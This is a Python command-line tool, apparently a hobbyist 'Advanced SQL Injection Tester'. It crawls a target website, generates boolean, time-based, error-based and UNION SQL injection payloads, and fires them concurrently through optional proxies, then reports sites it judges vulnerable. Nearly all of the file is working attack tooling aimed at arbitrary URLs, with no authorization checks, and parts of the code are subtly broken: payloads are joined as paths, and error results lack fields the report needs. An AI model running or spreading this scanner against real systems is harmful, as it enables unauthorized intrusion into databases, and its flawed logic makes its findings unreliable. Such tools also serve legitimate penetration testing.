import argparse
import requests
import concurrent.futures
from colorama import Fore, Style, init
import time
import sys
from urllib.parse import urlparse, urljoin
import csv
import json
import logging
import random
from requests.exceptions import RequestException, Timeout
import urllib3
import sqlite3
from bs4 import BeautifulSoup
import matplotlib.pyplot as plt
from sklearn.cluster import KMeans
import numpy as np
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)  # Initialize colorama

BANNER = f"""{Fore.CYAN}
 ____   ____   ___   _     ___   ___   ___  
| __ ) / ___| / _ \ | |   |_ _| |__ \ / _ \ 
|  _ \ \___ \| | | || |    | |    ) | | | |
| |_) | ___) | |_| || |___ | |   / /| |_| |
|____/ |____/ \__\_\|_____|___| |____\\___/ 
                                         
        Advanced SQL Injection Tester By a7t0fwa7 inspired from Coffinxp
{Style.RESET_ALL}"""

class AdvancedSQLiTester:
    def __init__(self, config):
        self.config = config
        self.urls = [config.url] if config.url else []
        self.payloads = []
        self.results = []
        self.setup_session()
        self.setup_logging()
        self.setup_database()

    def setup_session(self):
        self.session = requests.Session()
        retries = Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retries)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def setup_logging(self):
        level = logging.DEBUG if self.config.verbose else logging.INFO
        logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

    def setup_database(self):
        if self.config.use_db:
            self.conn = sqlite3.connect('sqli_results.db')
            self.cursor = self.conn.cursor()
            self.cursor.execute('''CREATE TABLE IF NOT EXISTS results
                                (url TEXT, vulnerable BOOLEAN, response_time REAL, status_code INTEGER, content_length INTEGER)''')

    def crawl_website(self, base_url):
        logging.info(f"Crawling website: {base_url}")
        visited = set()
        to_visit = [base_url]
        
        while to_visit:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)
            
            try:
                response = self.session.get(url, timeout=self.config.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a'):
                    href = link.get('href')
                    if href:
                        full_url = urljoin(base_url, href)
                        if full_url.startswith(base_url) and full_url not in visited:
                            to_visit.append(full_url)
            except Exception as e:
                logging.error(f"Error crawling {url}: {str(e)}")
        
        logging.info(f"Crawling completed. Found {len(visited)} URLs.")
        return list(visited)

    def generate_payloads(self, db_type=None):
        logging.info("Generating payloads")
        base_payloads = {
            "boolean_based": [
                "' OR '1'='1",
                "' AND '1'='1",
                "' OR '1'='2",
                "' AND '1'='2",
            ],
            "time_based": [
                "' OR SLEEP(5)--",
                "' AND SLEEP(5)--",
                "1 OR SLEEP(5)--",
                "1 AND SLEEP(5)--",
            ],
            "error_based": [
                "' OR 1=1--",
                "' OR 1=2--",
                "' AND 1=1--",
                "' AND 1=2--",
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL, NULL--",
                "' UNION SELECT NULL, NULL, NULL--",
                "' UNION SELECT NULL, NULL, NULL, NULL--",
            ]
        }

        generated = []
        for category in self.config.payload_categories:
            for payload in base_payloads.get(category, []):
                generated.append(payload)
                generated.append(payload.replace("'", '"'))
                generated.append(payload.replace(" ", "/**/"))
                if db_type == "mysql":
                    generated.append(payload.replace("SLEEP", "BENCHMARK(1000000,MD5(1))"))
                elif db_type == "mssql":
                    generated.append(payload.replace("SLEEP", "WAITFOR DELAY '00:00:05'"))

        logging.info(f"Generated {len(generated)} payloads")
        return generated

    def perform_request(self, url, payload):
        url_with_payload = urljoin(url, payload)
        start_time = time.time()

        headers = {
            'User-Agent': self.config.user_agent,
            'Cookie': f'cookie={self.config.cookie}' if self.config.cookie else ''
        }

        proxies = {'http': self.config.proxy, 'https': self.config.proxy} if self.config.proxy else None

        try:
            if self.config.delay:
                time.sleep(random.uniform(0, self.config.delay))

            with self.session.get(url_with_payload, headers=headers, proxies=proxies, 
                                  timeout=self.config.timeout, verify=False, stream=True) as response:
                response_time = time.time() - start_time
                content_length = int(response.headers.get('Content-Length', 0))
                content = response.text

                # Deep response analysis
                sql_error_indicators = ["You have an error in your SQL syntax", "Warning: mysql", "Unclosed quotation mark", "ORA-00933"]
                is_vulnerable = any(indicator in content for indicator in sql_error_indicators) or response_time >= 5

                # Contextual testing: performing slight variations to check for inconsistencies
                inconsistencies = self.check_for_inconsistencies(url, payload)

                result = {
                    'url': url_with_payload,
                    'vulnerable': is_vulnerable or inconsistencies,
                    'response_time': response_time,
                    'status_code': response.status_code,
                    'content_length': content_length
                }
                self.results.append(result)
                logging.debug(f"Tested: {url_with_payload} - Vulnerable: {is_vulnerable}")

                if self.config.use_db:
                    self.cursor.execute("INSERT INTO results VALUES (?, ?, ?, ?, ?)",
                                        (result['url'], result['vulnerable'], result['response_time'], result['status_code'], result['content_length']))
                    self.conn.commit()

                return result
        except Timeout:
            logging.warning(f"Timeout occurred for {url_with_payload}")
            self.results.append({
                'url': url_with_payload,
                'vulnerable': False,
                'response_time': self.config.timeout,
                'status_code': 'Timeout',
                'error': 'Request timed out'
            })
        except RequestException as e:
            logging.error(f"Error testing {url_with_payload}: {str(e)}")
            self.results.append({
                'url': url_with_payload,
                'vulnerable': False,
                'response_time': 0,
                'status_code': 'Error',
                'error': str(e)
            })
        return None

    def check_for_inconsistencies(self, url, payload):
        variations = [
            payload.replace("'", "`"),
            payload.replace(" OR ", " || "),
            payload.replace(" AND ", " && "),
        ]
        original_response = self.session.get(urljoin(url, payload)).text

        for variation in variations:
            test_response = self.session.get(urljoin(url, variation)).text
            if test_response != original_response:
                logging.info(f"Inconsistency detected with variation: {variation}")
                return True
        return False

    def run(self):
        if self.config.crawl:
            self.urls = self.crawl_website(self.config.url)
        
        if self.config.generate_payloads:
            self.payloads = self.generate_payloads()
        else:
            with open(self.config.payloads, 'r') as file:
                self.payloads = file.read().splitlines()

        total_requests = len(self.urls) * len(self.payloads)
        logging.info(f"Starting tests with {len(self.urls)} URLs and {len(self.payloads)} payloads")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = [executor.submit(self.perform_request, url, payload) 
                       for url in self.urls for payload in self.payloads]
            
            for _ in concurrent.futures.as_completed(futures):
                pass

    def display_results(self):
        vulnerable_count = sum(1 for result in self.results if result.get('vulnerable', False))
        print(f"\nResults: {vulnerable_count} potentially vulnerable URLs found.")
        for result in self.results:
            color = Fore.RED if result['vulnerable'] else Fore.GREEN
            print(f"{color}{result['url']} - Vulnerable: {result['vulnerable']} - "
                  f"Response Time: {result['response_time']:.2f}s - Status: {result['status_code']} - "
                  f"Content Length: {result['content_length']}")

        if self.config.generate_csv:
            with open('sqli_results.csv', 'w', newline='') as csvfile:
                fieldnames = ['url', 'vulnerable', 'response_time', 'status_code', 'content_length']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(self.results)
            print("Results saved to sqli_results.csv")

        if self.config.generate_json:
            with open('sqli_results.json', 'w') as jsonfile:
                json.dump(self.results, jsonfile, indent=4)
            print("Results saved to sqli_results.json")

        if self.config.generate_html:
            html_content = self.generate_html_report()
            with open('sqli_results.html', 'w') as htmlfile:
                htmlfile.write(html_content)
            print("Results saved to sqli_results.html")

    def generate_html_report(self):
        report = """
        <html>
        <head><title>SQL Injection Test Report</title></head>
        <body>
        <h1>SQL Injection Test Report</h1>
        <table border="1">
        <tr><th>URL</th><th>Vulnerable</th><th>Response Time (s)</th><th>Status Code</th><th>Content Length</th></tr>
        """
        for result in self.results:
            color = 'red' if result['vulnerable'] else 'green'
            report += f"<tr style='color:{color};'><td>{result['url']}</td><td>{result['vulnerable']}</td><td>{result['response_time']:.2f}</td><td>{result['status_code']}</td><td>{result['content_length']}</td></tr>"
        report += "</table></body></html>"
        return report

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Tester")
    parser.add_argument('-u', '--url', help='Target URL', required=False)
    parser.add_argument('-p', '--payloads', help='File with list of payloads', required=False)
    parser.add_argument('--generate-payloads', help='Generate common SQLi payloads', action='store_true')
    parser.add_argument('-c', '--cookie', help='Cookie for authentication', required=False)
    parser.add_argument('--crawl', help='Crawl the target website for URLs', action='store_true')
    parser.add_argument('--use-db', help='Store results in SQLite database', action='store_true')
    parser.add_argument('--user-agent', help='Custom User-Agent string', default='AdvancedSQLiTester/1.0')
    parser.add_argument('--proxy', help='Proxy to use for requests', required=False)
    parser.add_argument('--threads', help='Number of threads', type=int, default=10)
    parser.add_argument('--timeout', help='Request timeout in seconds', type=int, default=10)
    parser.add_argument('--delay', help='Delay between requests', type=float, default=0.0)
    parser.add_argument('--verbose', help='Verbose output', action='store_true')
    parser.add_argument('--generate-csv', help='Generate CSV report', action='store_true')
    parser.add_argument('--generate-json', help='Generate JSON report', action='store_true')
    parser.add_argument('--generate-html', help='Generate HTML report', action='store_true')
    parser.add_argument('--payload-categories', nargs='+', choices=['boolean_based', 'time_based', 'error_based', 'union_based'],
                        help='Categories of SQLi payloads to use', default=['boolean_based', 'time_based', 'error_based', 'union_based'])

    args = parser.parse_args()

    if not args.url and not args.payloads:
        parser.error('At least a URL or a payload file is required')

    tester = AdvancedSQLiTester(args)
    tester.run()
    tester.display_results()
